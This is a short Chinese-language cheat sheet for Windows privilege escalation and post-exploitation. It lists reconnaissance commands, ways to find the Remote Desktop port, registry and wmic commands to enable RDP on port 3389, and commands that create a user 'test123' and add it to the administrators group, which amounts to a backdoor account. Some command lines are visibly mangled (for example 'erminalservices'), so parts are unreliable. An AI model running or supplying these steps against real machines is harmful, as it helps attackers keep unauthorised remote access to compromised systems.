# win提权



### CMD探查

```text
systeminfo ：查看系统版本信息
netstat -ano : 查看系统开放端口
tasklist /svc : 查看系统进程
ipconfig : 查看ip地址
whoami : 查看当前用户
net user : 查看计算机用户列表
net localgroup : 查看计算机用户组列表
```

### 查看远程桌面的端口

```text
# 方式一
REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber

# 方式二
tasklist /svc查询TermService对应PID
再netstat -ano查询PID对应的端口号

# 方式三
查询注册表HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\ Wds dpwd\Tds cp 中PortNumber的值
```

### 开启3389

```text
# 方式一 通用开3389(优化后)：
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1

## 方式二 For Win2003
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f

# 方式三 For Win2008
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f

# 方式四.For Every
cmd开3389 win08 win03 win7 win2012 winxp win08，三条命令即可:
wmic /namespace:\root\cimv2 erminalservices path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1
wmic /namespace:\root\cimv2 erminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
win2012通用；win7前两条即可。权限需要run as administrator。
```

### 添加用户

```text
net user test123 Test123 /add : 添加test123用户并设置密码为Test123
net localgroup administrators test123 /add : 将用户加入管理组
```

